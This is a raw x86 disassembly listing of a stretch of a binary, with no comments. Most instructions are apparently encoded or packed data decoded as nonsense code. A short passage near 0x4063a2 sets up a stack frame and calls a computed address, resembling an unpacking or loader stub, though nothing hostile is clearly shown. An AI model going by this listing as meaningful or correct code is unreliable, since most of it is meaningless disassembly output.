  406057:	inc    eax
  406058:	inc    eax
  406059:	add    eax,0x62434162
  40605e:	inc    eax
  40605f:	js     0x406071
  406061:	inc    ecx
  406062:	add    eax,0x5404325
  406067:	bound  eax,QWORD PTR [eax+0x40]
  40606a:	inc    ecx
  40606b:	inc    ebx
  40606c:	push   edi
  40606d:	dec    ebx
  40606e:	arpl   WORD PTR ds:0xe1045501,dx
  406074:	popa   
  406075:	mov    bl,0xbe
  406077:	aam    0x4c
  406079:	test   al,0xcd
  40607b:	inc    esi
  40607c:	out    dx,al
  40607d:	ins    BYTE PTR es:[edi],dx
  40607e:	loopne 0x406052
  406080:	push   ebx
  406081:	adc    BYTE PTR [eax+0x157f65f9],bh
  406087:	lds    eax,FWORD PTR [ebx-0x68]
  40608a:	adc    eax,0x6344529f
  40608f:	dec    edi
  406090:	inc    DWORD PTR ds:0x41252fcb
  406096:	bound  eax,QWORD PTR [ebx+0x0]
  406099:	adc    BYTE PTR [eax+0x0],al
  40609c:	add    eax,0x62410040
  4060a1:	inc    eax
  4060a2:	add    BYTE PTR [ebx-0x34],al
  4060a5:	inc    eax
  4060a6:	add    eax,0x78434040
  4060ab:	bound  eax,QWORD PTR [ecx+0x78]
  4060ae:	add    eax,0x62404043
  4060b3:	and    DWORD PTR [ebx],edx
  4060b5:	dec    ebx
  4060b6:	inc    eax
  4060b7:	mov    ecx,0x2fd848cd
  4060bc:	daa    
  4060bd:	and    al,0x90
  4060bf:	gs inc ebx
  4060c1:	retf   
  4060c2:	ja     0x406107
  4060c4:	jb     0x406085
  4060c6:	cmp    eax,0x414c7971
  4060cb:	inc    eax
  4060cc:	add    eax,0x43436240
  4060d1:	add    eax,0x62004040
  4060d6:	inc    eax
  4060d7:	add    BYTE PTR [ecx+0x40],al
  4060da:	inc    ebx
  4060db:	test   BYTE PTR ds:0x58054041,ah
  4060e1:	inc    eax
  4060e2:	inc    eax
  4060e3:	bound  eax,QWORD PTR [eax+0x66]
  4060e6:	inc    ecx
  4060e7:	inc    eax
  4060e8:	add    eax,0x39624800
  4060ed:	add    eax,ebx
  4060ef:	xor    al,0x5c
  4060f1:	inc    edi
  4060f2:	jl     0x40612c
  4060f4:	jnp    0x40609e
  4060f6:	dec    edx
  4060f7:	rcl    DWORD PTR [edx+0x58],cl
  4060fa:	movntps XMMWORD PTR [eax],xmm2
  4060fd:	adc    BYTE PTR [ebp-0x62],al
  406100:	xor    eax,0xbda70fd8
  406105:	fs push cs
  406107:	arpl   WORD PTR [esi+0x68],dx
  40610a:	xchg   ebx,eax
  40610b:	push   esi
  40610c:	pusha  
  40610d:	add    ah,ah
  40610f:	fcom   st(1)
  406111:	mov    eax,0x40430000
  406116:	bound  eax,QWORD PTR ds:0x25404110
  40611c:	add    ah,cl
  40611e:	inc    ebx
  40611f:	add    eax,0x40402562
  406124:	add    BYTE PTR [eax+0x40],al
  406127:	inc    ecx
  406128:	inc    ecx
  406129:	add    eax,0x78434025
  40612e:	bound  eax,QWORD PTR [eax-0x7c]
  406131:	inc    eax
  406132:	inc    ecx
  406133:	aaa    
  406134:	loope  0x406138
  406136:	retf   
  406137:	arpl   si,sp
  406139:	sub    al,0xf5
  40613b:	cld    
  40613c:	xor    DWORD PTR es:[eax+edx*4+0x11],eax
  406141:	push   esi
  406142:	(bad)  
  406144:	and    eax,DWORD PTR [eax-0x31]
  406147:	add    eax,0xf5c1d180
  40614c:	inc    edx
  40614d:	push   ecx
  40614e:	and    al,0xc9
  406150:	imul   eax,DWORD PTR cs:[edx+0x70],0x21
  406155:	dec    ebx
  406156:	inc    ecx
  406157:	inc    eax
  406158:	inc    eax
  406159:	inc    ebx
  40615a:	int3   
  40615b:	add    BYTE PTR ds:0x56240,al
  406161:	inc    ebx
  406162:	inc    eax
  406163:	inc    eax
  406164:	add    BYTE PTR [ecx+0x62],al
  406167:	bound  eax,QWORD PTR [eax]
  406169:	int3   
  40616a:	inc    eax
  40616b:	inc    ebx
  40616c:	add    eax,0x43624041
  406171:	adc    BYTE PTR [ecx+0x5],al
  406174:	inc    eax
  406175:	bound  eax,QWORD PTR [ebx+eiz*2-0x58]
  406179:	mov    ebp,0x683fc25c
  40617e:	inc    ecx
  40617f:	mov    al,0xe3
  406181:	jnp    0x406112
  406183:	and    DWORD PTR [eax],eax
  406185:	or     BYTE PTR [ecx-0x78],al
  406188:	xor    dh,BYTE PTR [ebp+0x3a]
  40618b:	pop    eax
  40618c:	icebp  
  40618d:	pushf  
  40618e:	xor    BYTE PTR [ecx-0x68],al
  406191:	dec    esp
  406192:	mov    ecx,fs
  406194:	inc    ebp
  406195:	mov    bl,BYTE PTR [ecx+0x62]
  406198:	cld    
  406199:	outs   dx,DWORD PTR ds:[esi]
  40619a:	cmp    bh,bh
  40619c:	xlat   BYTE PTR ds:[ebx]
  40619d:	bound  edx,QWORD PTR [ebx+ebp*2+0x62]
  4061a1:	inc    ebx
  4061a2:	inc    eax
  4061a3:	adc    BYTE PTR ds:0x4158cc40,al
  4061a9:	inc    ebx
  4061aa:	bound  eax,QWORD PTR [ecx+0x40]
  4061ad:	add    eax,0x4140
  4061b2:	and    eax,0x40400062
  4061b7:	add    eax,0x84404340
  4061bc:	int3   
  4061bd:	js     0x4061bf
  4061bf:	inc    ecx
  4061c0:	adc    BYTE PTR [edx+0xf],ah
  4061c3:	bound  edi,QWORD PTR [eax+0x42]
  4061c6:	push   edx
  4061c7:	outs   dx,DWORD PTR ds:[esi]
  4061c8:	icebp  
  4061c9:	test   al,0x4c
  4061cb:	sub    ah,ah
  4061cd:	je     0x406172
  4061cf:	mov    cl,0x3c
  4061d1:	inc    eax
  4061d2:	or     eax,0x68b6210
  4061d7:	inc    ebp
  4061d8:	bound  ebp,QWORD PTR [edx]
  4061da:	retf   
  4061db:	or     BYTE PTR [ebp+eiz*4+0x21],0x31
  4061e0:	inc    edi
  4061e1:	test   al,0xf
  4061e3:	add    eax,0x493d0d
  4061e8:	inc    eax
  4061e9:	inc    ecx
  4061ea:	inc    eax
  4061eb:	inc    ebx
  4061ec:	bound  ax,DWORD PTR ds:0x40434100
  4061f3:	add    eax,0x40054062
  4061f8:	bound  eax,QWORD PTR [ecx+0x40]
  4061fb:	inc    ebx
  4061fc:	inc    eax
  4061fd:	add    eax,0x25405841
  406202:	bound  eax,QWORD PTR [eax+0x43]
  406205:	inc    eax
  406206:	adc    BYTE PTR [edi],bh
  406208:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406209:	add    eax,0x7e55cd34
  40620e:	jecxz  0x406254
  406210:	imul   ecx,ecx,0x76fe124c
  406216:	inc    edx
  406217:	icebp  
  406218:	xchg   edi,eax
  406219:	inc    ebp
  40621a:	inc    esp
  40621b:	inc    ebx
  40621c:	das    
  40621d:	(bad)
  406221:	mov    ?,WORD PTR [ecx]
  406223:	sar    bl,0xef
  406226:	adc    ebx,esi
  406228:	pop    ss
  406229:	push   0xfda848fc
  40622e:	mov    ds:0x5363c869,eax
  406233:	bound  edx,QWORD PTR [eax]
  406235:	stos   DWORD PTR es:[edi],eax
  406236:	inc    eax
  406237:	inc    ecx
  406238:	inc    ebx
  406239:	inc    eax
  40623a:	add    eax,0x43406262
  40623f:	inc    ecx
  406240:	adc    BYTE PTR [eax],al
  406242:	inc    eax
  406243:	add    eax,0x43000562
  406248:	add    BYTE PTR [ecx+0x40],al
  40624b:	inc    eax
  40624c:	add    eax,0x400062
  406251:	inc    ebx
  406252:	inc    eax
  406253:	js     0x406296
  406255:	inc    ecx
  406256:	bound  eax,QWORD PTR [eax+0x30]
  406259:	push   ebp
  40625a:	jb     0x4062bf
  40625c:	pop    ss
  40625d:	inc    ecx
  40625e:	inc    edx
  40625f:	mov    bl,0x21
  406261:	and    eax,esp
  406263:	push   ecx
  406264:	cli    
  406265:	aam    0xcb
  406267:	call   0x8d8f75e9
  40626c:	add    eax,0x69cd48cd
  406271:	rol    BYTE PTR [eax-0x56],0x63
  406275:	mov    ah,0x15
  406277:	cmp    eax,0x62685140
  40627c:	xchg   esi,eax
  40627d:	inc    ecx
  40627e:	retf   
  40627f:	bound  eax,QWORD PTR [eax+0x5]
  406282:	inc    ecx
  406283:	add    BYTE PTR [ebx+0x40],al
  406286:	inc    eax
  406287:	inc    ecx
  406288:	inc    eax
  406289:	inc    eax
  40628a:	bound  eax,QWORD PTR ds:0x5624300
  406290:	add    BYTE PTR [eax+0x40],al
  406293:	add    BYTE PTR [ecx+0x43],al
  406296:	add    BYTE PTR [eax+0x41],al
  406299:	add    eax,0x40436200
  40629e:	inc    eax
  40629f:	add    eax,0x5ca34362
  4062a4:	cmp    ch,cl
  4062a6:	stos   DWORD PTR es:[edi],eax
  4062a7:	in     al,dx
  4062a8:	pop    edx
  4062a9:	ja     0x40626a
  4062ab:	ja     0x406270
  4062ad:	adc    al,BYTE PTR [edx-0x8]
  4062b0:	inc    edi
  4062b1:	loope  0x406305
  4062b3:	dec    ecx
  4062b4:	mov    esp,0x5a52aba4
  4062b9:	fs in  eax,0x1b
  4062bc:	add    eax,0x2c2bb815
  4062c1:	mov    ch,0xf1
  4062c3:	iret   
  4062c4:	inc    esi
  4062c5:	inc    ecx
  4062c6:	inc    edx
  4062c7:	jnp    0x406315
  4062c9:	pop    ecx
  4062ca:	test   eax,0x7b7b4139
  4062cf:	imul   eax,DWORD PTR [ecx+eax*1+0x6430bfde],0x54041dc
  4062da:	inc    eax
  4062db:	inc    ebx
  4062dc:	bound  eax,QWORD PTR [ecx-0x7c]
  4062df:	add    BYTE PTR ds:0x404043,ah
  4062e5:	add    BYTE PTR ds:0x626210,al
  4062eb:	add    eax,0x43404140
  4062f0:	inc    eax
  4062f1:	inc    ecx
  4062f2:	add    eax,0x10664062
  4062f7:	inc    ebx
  4062f8:	bound  esp,QWORD PTR [edx-0x3d]
  4062fb:	out    0x69,eax
  4062fd:	and    edi,DWORD PTR [edi+0x66]
  406300:	arpl   dx,di
  406302:	xchg   ecx,eax
  406303:	cmp    cl,BYTE PTR [esi+0x6340c451]
  406309:	ret    
  40630a:	inc    ecx
  40630b:	fisub  WORD PTR [ecx+0x5f]
  40630e:	dec    edi
  40630f:	outs   dx,DWORD PTR ds:[esi]
  406310:	inc    esp
  406311:	leave  
  406312:	pop    edx
  406313:	mov    al,0xe
  406315:	icebp  
  406316:	inc    eax
  406317:	popf   
  406318:	push   edx
  406319:	arpl   sp,cx
  40631b:	mov    al,0xa1
  40631d:	and    DWORD PTR [edx+eiz*2+0x35],esp
  406321:	add    eax,0xb365576d
  406326:	cmp    al,BYTE PTR ds:0x4041cc
  40632c:	add    BYTE PTR [eax],al
  40632e:	inc    eax
  40632f:	inc    eax
  406330:	inc    ebx
  406331:	bound  eax,QWORD PTR [eax]
  406333:	inc    eax
  406334:	inc    eax
  406335:	add    eax,0x62434162
  40633a:	inc    eax
  40633b:	js     0x40634d
  40633d:	inc    ecx
  40633e:	add    eax,0x5404325
  406343:	bound  eax,QWORD PTR [eax+0x40]
  406346:	inc    ecx
  406347:	inc    ebx
  406348:	mov    cl,0x1c
  40634a:	xchg   DWORD PTR [ebx+ebp*4+0x63],ebx
  40634e:	rol    bl,0x24
  406351:	mov    ecx,0x43aa6240
  406356:	icebp  
  406357:	mov    esp,0x9d6ec343
  40635c:	lea    esp,[ebx+0x41a21557]
  406362:	(bad)  
  406363:	inc    BYTE PTR ss:[ebx-0x45]
  406367:	inc    esi
  406368:	les    edx,FWORD PTR [edx+eiz*2]
  40636b:	test   al,0x7d
  40636d:	pusha  
  40636e:	push   esi
  40636f:	dec    ecx
  406370:	dec    edi
  406371:	or     BYTE PTR [edx-0x4e404bf0],al
  406377:	sub    al,0x40
  406379:	lock mov di,0x2dfe
  40637e:	and    eax,0x436241
  406383:	adc    BYTE PTR [eax+0x0],al
  406386:	add    eax,0x62410040
  40638b:	inc    eax
  40638c:	add    BYTE PTR [ebx-0x34],al
  40638f:	inc    eax
  406390:	add    eax,0x78434040
  406395:	bound  eax,QWORD PTR [ecx+0x78]
  406398:	add    eax,0x62404043
  40639d:	inc    eax
  40639e:	int3   
  40639f:	int3   
  4063a0:	inc    eax
  4063a1:	inc    ecx
  4063a2:	xor    eax,ecx
  4063a4:	push   ebp
  4063a5:	mov    ebp,esp
  4063a7:	push   eax
  4063a8:	mov    ecx,eax
  4063aa:	inc    ecx
  4063ab:	call   0x409230
  4063b0:	push   0x4307db
  4063b5:	push   0x40
  4063b7:	mov    edx,0x41dfe1
  4063bc:	push   0xfec
  4063c1:	push   edx
  4063c2:	jmp    0x4063dd
  4063c4:	mov    ecx,0x7f
  4063c9:	mov    edi,0x41dfe1
  4063ce:	inc    ecx
  4063cf:	mov    eax,ds:0x42f91d
  4063d4:	call   0x41db10
  4063d9:	pop    eax
  4063da:	inc    eax
  4063db:	inc    eax
  4063dc:	ret    
  4063dd:	call   eax
  4063df:	lea    esi,ds:0x41dc10
  4063e5:	jmp    0x4063c4
  4063e7:	int3   
  4063e8:	int3   
  4063e9:	int3   
  4063ea:	int3   
  4063eb:	int3   
  4063ec:	int3   
  4063ed:	int3   
  4063ee:	int3   
  4063ef:	int3   
  4063f0:	xchg   BYTE PTR [esi-0x40bff97e],al
  4063f6:	xor    eax,0x406e05db
  4063fb:	xor    edi,DWORD PTR [eax+0x4f]
  4063fe:	jmp    0x5758:0x40f017a9
  406405:	bound  eax,QWORD PTR [ebx+0x40]
  406408:	adc    BYTE PTR ds:0x4158cc40,al
  40640e:	inc    ebx
  40640f:	bound  eax,QWORD PTR [ecx+0x40]
  406412:	add    eax,0x4140
  406417:	and    eax,0x40400062
  40641c:	add    eax,0x84404340
  406421:	int3   
  406422:	js     0x406424
  406424:	inc    ecx
  406425:	adc    BYTE PTR [edx+0xf],ah
  406428:	sub    cl,BYTE PTR [esp+ebx*4-0x2a]
  40642c:	add    eax,0x30407240
  406431:	sub    BYTE PTR ds:0xa9548655,al
  406437:	ins    DWORD PTR es:[edi],dx
  406438:	enter  0xcb02,0x84
  40643c:	xor    al,BYTE PTR [eax+0x59]
  40643f:	sub    BYTE PTR [eax+0x62],cl
  406442:	dec    eax
  406443:	pop    ds
  406444:	out    dx,eax
  406445:	inc    eax
  406446:	rcr    DWORD PTR [ecx+0x1a],1
  406449:	add    al,0x35
  40644b:	rol    DWORD PTR ds:0xa6404670,0x7c
  406452:	inc    eax
  406453:	push   esi
  406454:	xchg   BYTE PTR [eax+0x33],al
  406457:	and    al,0x58
  406459:	bound  edx,QWORD PTR [eax-0x7e]
  40645c:	and    eax,0x4000497e
  406461:	inc    ecx
  406462:	inc    eax
  406463:	inc    ebx
  406464:	bound  ax,DWORD PTR ds:0x40434100
  40646b:	add    eax,0x40054062
  406470:	bound  eax,QWORD PTR [ecx+0x40]
  406473:	inc    ebx
  406474:	inc    eax
  406475:	add    eax,0x25405841
  40647a:	bound  eax,QWORD PTR [eax+0x43]
  40647d:	inc    eax
  40647e:	adc    BYTE PTR [ebx-0x9],bl
  406481:	outs   dx,BYTE PTR ds:[esi]
  406482:	inc    edi
  406483:	dec    edx
  406484:	out    dx,al
  406485:	stos   BYTE PTR es:[edi],al
  406486:	jno    0x4064c8
  406488:	pop    es
  406489:	sub    dl,BYTE PTR [ecx+eiz*4+0x5]
  40648d:	jle    0x4064ea
  40648f:	aaa    
  406490:	aaa    
  406491:	push   es
  406492:	xor    al,0x80
  406494:	xchg   BYTE PTR ds:0x3e2f6158,dl
  40649a:	push   ebx
  40649b:	dec    ebp
  40649c:	sub    al,0x7e
  40649e:	xor    eax,0x3c62f047
  4064a3:	in     eax,dx
  4064a4:	in     eax,dx
  4064a5:	js     0x406445
  4064a7:	add    eax,0x2a4cc437
  4064ac:	add    eax,0xa141037e
  4064b1:	dec    edi
  4064b2:	push   ebx
  4064b3:	clc    
  4064b4:	inc    eax
  4064b5:	inc    ecx
  4064b6:	inc    ebx
  4064b7:	inc    eax
  4064b8:	add    eax,0x43406262
  4064bd:	inc    ecx
  4064be:	adc    BYTE PTR [eax],al
  4064c0:	inc    eax
  4064c1:	add    eax,0x43000562
  4064c6:	add    BYTE PTR [ecx+0x40],al
  4064c9:	inc    eax
  4064ca:	add    eax,0x400062
  4064cf:	inc    ebx
  4064d0:	inc    eax
  4064d1:	js     0x406514
  4064d3:	inc    ecx
  4064d4:	bound  eax,QWORD PTR [eax-0x7a]
  4064d7:	pop    ebx
  4064d8:	push   ebp
  4064d9:	pop    ecx
  4064da:	mov    dh,0x33
  4064dc:	(bad)  
  4064de:	xor    al,0x7d
  4064e0:	rol    BYTE PTR [eax-0x7],0xea
  4064e4:	daa    
  4064e5:	adc    eax,0x1713beec
  4064ea:	data16 arpl WORD PTR [ecx+eax*2+0x2fd87d05],cx
  4064f2:	sbb    ebx,DWORD PTR [ebx]
  4064f4:	push   0x73a186a0
  4064f9:	pop    ebp
  4064fa:	rcl    DWORD PTR [ebx+edx*2+0x406229d0],0x5
  406502:	inc    ecx
  406503:	add    BYTE PTR [ebx+0x40],al
  406506:	inc    eax
  406507:	inc    ecx
  406508:	inc    eax
  406509:	inc    eax
  40650a:	bound  eax,QWORD PTR ds:0x5624300
  406510:	add    BYTE PTR [eax+0x40],al
  406513:	add    BYTE PTR [ecx+0x43],al
  406516:	add    BYTE PTR [eax+0x41],al
  406519:	add    eax,0x40436200
  40651e:	inc    eax
  40651f:	add    eax,0x405e7d62
  406524:	(bad)  
  406525:	sbb    al,0xdd
  406527:	push   esp
  406528:	jmp    0x4064ae
  40652a:	xor    ebp,DWORD PTR [ebp+0x56]
  40652d:	cmp    ch,BYTE PTR [edx-0x6]
  406530:	add    eax,0x8d694f7d
  406535:	test   al,0xa0
  406537:	cld    
  406538:	xchg   bh,ah
  40653a:	repnz inc ecx
  40653c:	pop    edi
  40653d:	inc    ecx
  40653e:	inc    eax
  40653f:	add    eax,0x41624340
  406544:	test   BYTE PTR [eax],al
  406546:	and    eax,0x404043
  40654b:	add    BYTE PTR ds:0x626210,al
  406551:	add    eax,0x43404140
  406556:	inc    eax
  406557:	inc    ecx
  406558:	add    eax,0x10664062
  40655d:	inc    ebx
  40655e:	bound  edx,QWORD PTR [edx]
  406560:	inc    edx
  406561:	adc    ah,BYTE PTR [edi]
  406563:	jge    0x406597
  406565:	pop    ecx
  406566:	call   0x5aca:0xea661cb0
  40656d:	inc    eax
  40656e:	ret    
  40656f:	inc    edx
  406570:	push   0x917d0556
  406575:	xor    ch,BYTE PTR [esi]
  406577:	pop    es
  406578:	mov    esp,0xa22d86fa
  40657d:	or     eax,0x552d828
  406582:	das    
  406583:	jge    0x4065d8
  406585:	inc    eax
  406586:	popf   
  406587:	arpl   WORD PTR [ebp+0x4041cc05],di
  40658d:	add    BYTE PTR [eax],al
  40658f:	add    BYTE PTR [eax+0x40],al
  406592:	inc    ebx
  406593:	bound  eax,QWORD PTR [eax]
  406595:	inc    eax
  406596:	inc    eax
  406597:	add    eax,0x62434162
  40659c:	inc    eax
  40659d:	js     0x4065af
  40659f:	inc    ecx
  4065a0:	add    eax,0x5404325
  4065a5:	bound  eax,QWORD PTR [eax+0x40]
  4065a8:	inc    ecx
  4065a9:	inc    ebx
  4065aa:	adc    eax,0x2dbb10e9
  4065af:	repz inc ecx
  4065b1:	js     0x406541
  4065b3:	add    eax,0xb81a577d
  4065b8:	inc    ecx
  4065b9:	adc    DWORD PTR [esi+eax*4+0x73],edx
  4065bd:	mov    bl,0x63
  4065bf:	mov    cl,0xc
  4065c1:	cmp    eax,0x5d7d2b99
  4065c6:	inc    esi
  4065c7:	xchg   esp,eax
  4065c8:	int    0xcb
  4065ca:	add    al,ch
  4065cc:	push   esi
  4065cd:	push   ebx
  4065ce:	jo     0x406572
  4065d0:	mov    ah,0x4c
  4065d2:	push   ebx
  4065d3:	and    eax,0x436241
  4065d8:	adc    BYTE PTR [eax+0x0],al
  4065db:	add    eax,0x62410040
  4065e0:	inc    eax
  4065e1:	add    BYTE PTR [ebx-0x34],al
  4065e4:	inc    eax
  4065e5:	add    eax,0x78434040
  4065ea:	bound  eax,QWORD PTR [ecx+0x78]
  4065ed:	add    eax,0x62404043
  4065f2:	add    eax,0x2405f7c
  4065f7:	add    eax,0xb986b6ab
  4065fc:	sbb    DWORD PTR [edx-0x3a],esi
  4065ff:	retf   
  406600:	and    BYTE PTR ds:0x517c,ch
  406605:	inc    eax
  406606:	xchg   ebx,eax
  406607:	dec    edx
  406608:	aaa    
  406609:	inc    ecx
  40660a:	inc    eax
  40660b:	add    eax,0x43436240
  406610:	add    eax,0x62004040
  406615:	inc    eax
  406616:	add    BYTE PTR [ecx+0x40],al
  406619:	inc    ebx
  40661a:	test   BYTE PTR ds:0x58054041,ah
  406620:	inc    eax
  406621:	inc    eax
  406622:	bound  eax,QWORD PTR [eax+0x66]
  406625:	inc    ecx
  406626:	inc    eax
  406627:	add    eax,0x9ce76300
  40662c:	xlat   BYTE PTR ds:[ebx]
  40662d:	jp     0x4065c1
  40662f:	inc    ebx
  406630:	mov    esp,0xc17c05f6
  406635:	ins    DWORD PTR es:[edi],dx
  406636:	xchg   esp,eax
  406637:	dec    esp
  406638:	add    eax,0x37ff860d
  40663d:	inc    eax
  40663e:	dec    ebx
  40663f:	adc    eax,0x7c259687
  406644:	retf   0x9b28
  406647:	retf   
  406648:	inc    edx
  406649:	loop   0x40664b
  40664b:	add    BYTE PTR [ebx+0x40],al
  40664e:	bound  eax,QWORD PTR ds:0x25404110
  406654:	add    ah,cl
  406656:	inc    ebx
  406657:	add    eax,0x40402562
  40665c:	add    BYTE PTR [eax+0x40],al
  40665f:	inc    ecx
  406660:	inc    ecx
  406661:	add    eax,0x78434025
  406666:	bound  eax,QWORD PTR [eax-0x7c]
  406669:	inc    eax
  40666a:	inc    ecx
  40666b:	out    0xe2,al
  40666d:	pop    ebx
  40666e:	ret    0xba9f
  406671:	leave  
  406672:	push   esp
  406673:	add    eax,0x618e467c
  406678:	inc    edx
  406679:	mov    eax,0x53c586f9
  40667e:	inc    ecx
  40667f:	cmp    al,0xc
  406681:	add    eax,0x4e7c28f4
  406686:	dec    edx
  406687:	pushf  
  406688:	int    0xcb
  40668a:	add    eax,0x407128e5
  40668f:	scas   eax,DWORD PTR es:[edi]
  406690:	dec    ebp
  406691:	dec    esp
  406692:	inc    esp
  406693:	add    eax,0xf728bf7c
  406698:	add    edx,DWORD PTR ds:0x5a0b86ef
  40669e:	inc    eax
  40669f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066a0:	aam    0xcb
  4066a2:	clc    
  4066a3:	inc    ecx
  4066a4:	inc    eax
  4066a5:	inc    eax
  4066a6:	inc    ebx
  4066a7:	int3   
  4066a8:	add    BYTE PTR ds:0x56240,al
  4066ae:	inc    ebx
  4066af:	inc    eax
  4066b0:	inc    eax
  4066b1:	add    BYTE PTR [ecx+0x62],al
  4066b4:	bound  eax,QWORD PTR [eax]
  4066b6:	int3   
  4066b7:	inc    eax
  4066b8:	inc    ebx
  4066b9:	add    eax,0x43624041
  4066be:	adc    BYTE PTR [ecx+0x5],al
  4066c1:	inc    eax
  4066c2:	xor    edi,DWORD PTR [ecx+esi*4+0x6d]
  4066c6:	xchg   ebp,eax
  4066c7:	retf   
  4066c8:	push   ecx
  4066c9:	repnz in al,0x6e
  4066cc:	(bad)  
  4066cd:	push   0xfffffffe
  4066cf:	dec    eax
  4066d0:	xor    eax,0x337c0515
  4066d5:	inc    eax
  4066d6:	dec    ebp
  4066d7:	adc    DWORD PTR [eax+0x535186c9],eax
  4066dd:	shl    BYTE PTR cs:[edi-0x3b],cl
  4066e1:	bound  eax,QWORD PTR es:[ebx+0x40]
  4066e5:	adc    BYTE PTR ds:0x4158cc40,al
  4066eb:	inc    ebx
  4066ec:	bound  eax,QWORD PTR [ecx+0x40]
  4066ef:	add    eax,0x4140
  4066f4:	and    eax,0x40400062
  4066f9:	add    eax,0x84404340
  4066fe:	int3   
  4066ff:	js     0x406701
  406701:	inc    ecx
  406702:	adc    BYTE PTR [edx+0xf],ah
  406705:	das    
  406706:	jnp    0x4066fb
  406708:	not    BYTE PTR [edx-0x1cbd6ee5]
  40670e:	mov    ah,0x1a
  406710:	inc    ecx
  406711:	into   
  406712:	bound  edi,QWORD PTR [edi-0x2c84faef]
  406718:	test   ebx,ebx
  40671a:	xor    al,0x40
  40671c:	sub    BYTE PTR [esi+0x4c7e2297],al
  406722:	xchg   esp,eax
  406723:	inc    eax
  406724:	cli    
  406725:	xor    bh,BYTE PTR [ebx+0x7f]
  406728:	inc    ecx
  406729:	mul    BYTE PTR [edx+0x41]
  40672c:	lock loop 0x406729
  40672f:	push   ebx
  406730:	cli    
  406731:	pop    ebx
  406732:	les    ebp,FWORD PTR [eax]
  406734:	or     eax,0x40b57b05
  406739:	js     0x40678a
  40673b:	enter  0xc9,0x40
  40673f:	inc    ecx
  406740:	inc    eax
  406741:	inc    ebx
  406742:	bound  ax,DWORD PTR ds:0x40434100
  406749:	add    eax,0x40054062
  40674e:	bound  eax,QWORD PTR [ecx+0x40]
  406751:	inc    ebx
  406752:	inc    eax
  406753:	add    eax,0x25405841
  406758:	bound  eax,QWORD PTR [eax+0x43]
  40675b:	inc    eax
  40675c:	adc    BYTE PTR [esi+0x3b304cdd],al
  406762:	inc    eax
  406763:	inc    esp
  406764:	es das 
  406766:	jnp    0x40673a
  406768:	inc    eax
  406769:	icebp  
  40676a:	mov    eax,0xc0e14240
  40676f:	xor    dh,BYTE PTR [ebx+0x6b]
  406772:	inc    ecx
  406773:	inc    esi
  406774:	mov    ch,0x5
  406776:	jnp    0x406736
  406778:	inc    eax
  406779:	out    dx,al
  40677a:	jae    0x4067b4
  40677c:	nop
  40677d:	xchg   BYTE PTR [ebx],ah
  40677f:	pop    eax
  406780:	jno    0x406724
  406782:	in     al,0x3e
  406784:	bound  esi,QWORD PTR [eax]
  406786:	jnp    0x406759
  406788:	inc    eax
  406789:	clc    
  40678a:	arpl   WORD PTR [eax+0x40434140],bp
  406790:	add    eax,0x43406262
  406795:	inc    ecx
  406796:	adc    BYTE PTR [eax],al
  406798:	inc    eax
  406799:	add    eax,0x43000562
  40679e:	add    BYTE PTR [ecx+0x40],al
  4067a1:	inc    eax
  4067a2:	add    eax,0x400062
  4067a7:	inc    ebx
  4067a8:	inc    eax
  4067a9:	js     0x4067ec
  4067ab:	inc    ecx
  4067ac:	bound  eax,QWORD PTR [eax-0x7]
  4067af:	loopne 0x4067b7
  4067b1:	push   ebx
  4067b2:	cmp    BYTE PTR [edx],0x54
  4067b5:	inc    eax
  4067b6:	out    dx,al
  4067b7:	add    eax,0x547a317b
  4067bc:	aam    0x2a
  4067be:	fwait
  4067bf:	xchg   BYTE PTR [ecx+0x76],ch
  4067c2:	bound  eax,QWORD PTR [eax+0x5]
  4067c5:	inc    ecx
  4067c6:	add    BYTE PTR [ebx+0x40],al
  4067c9:	inc    eax
  4067ca:	inc    ecx
  4067cb:	inc    eax
  4067cc:	inc    eax
  4067cd:	bound  eax,QWORD PTR ds:0x5624300
  4067d3:	add    BYTE PTR [eax+0x40],al
  4067d6:	add    BYTE PTR [ecx+0x43],al
  4067d9:	add    BYTE PTR [eax+0x41],al
  4067dc:	add    eax,0x40436200
  4067e1:	inc    eax
  4067e2:	add    eax,0xe7d53e62
  4067e7:	adc    BYTE PTR [esi],al
  4067e9:	inc    eax
  4067ea:	jnp    0x4067c0
  4067ec:	inc    eax
  4067ed:	jmp    FWORD PTR [esp+ebp*4]
  4067f0:	push   esi
  4067f1:	xor    BYTE PTR [esp+ebp*1+0x3a],cl
  4067f5:	or     al,BYTE PTR [eax+0x7a40ec05]
  4067fb:	inc    esi
  4067fc:	push   0xffffffc2
  4067fe:	adc    eax,0x40054041
  406803:	inc    ebx
  406804:	bound  eax,QWORD PTR [ecx-0x7c]
  406807:	add    BYTE PTR ds:0x404043,ah
  40680d:	add    BYTE PTR ds:0x626210,al
  406813:	add    eax,0x43404140
  406818:	inc    eax
  406819:	inc    ecx
  40681a:	add    eax,0x10664062
  40681f:	inc    ebx
  406820:	(bad)  
  406821:	int    0x15
  406823:	inc    eax
  406824:	scas   eax,DWORD PTR es:[edi]
  406825:	xchg   ecx,eax
  406826:	inc    eax
  406827:	inc    ebp
  406828:	int    0x12
  40682a:	sbb    dl,ch
  40682c:	jp     0x40689a
  40682e:	xor    eax,DWORD PTR [eax+0x4f]
  406831:	mov    ah,0x42
  406833:	hlt    
  406834:	xchg   edx,eax
  406835:	repz or dl,BYTE PTR [edi]
  406838:	xor    eax,0x7a625415
  40683d:	push   edx
  40683e:	dec    ebx
  40683f:	push   ebx
  406840:	inc    ebx
  406841:	int    0xfa
  406843:	add    eax,0x41cc05f5
  406848:	inc    eax
  406849:	add    BYTE PTR [eax],al
  40684b:	add    BYTE PTR [eax+0x40],al
  40684e:	inc    ebx
  40684f:	bound  eax,QWORD PTR [eax]
  406851:	inc    eax
  406852:	inc    eax
  406853:	add    eax,0x62434162
  406858:	inc    eax
  406859:	js     0x40686b
  40685b:	inc    ecx
  40685c:	add    eax,0x5404325
  406861:	bound  eax,QWORD PTR [eax+0x40]
  406864:	inc    ecx
  406865:	inc    ebx
  406866:	xor    ebp,DWORD PTR [edx]
  406868:	xor    cl,BYTE PTR [eax-0x4a]
  40686b:	jmp    0x3d47:0x41417a87
  406872:	or     eax,0x71d8ec0d
  406877:	push   esi
  406878:	daa    
  406879:	ret    
  40687a:	dec    ebx
  40687b:	leave  
  40687c:	mov    ds:0xc540af7a,al
  406881:	push   ebp
  406882:	inc    ecx
  406883:	bound  edi,QWORD PTR es:[ebx]
  406886:	or     edx,DWORD PTR [edi]
  406888:	stos   DWORD PTR es:[edi],eax
  406889:	inc    edi
  40688a:	rol    BYTE PTR [edx-0x54],0x7a
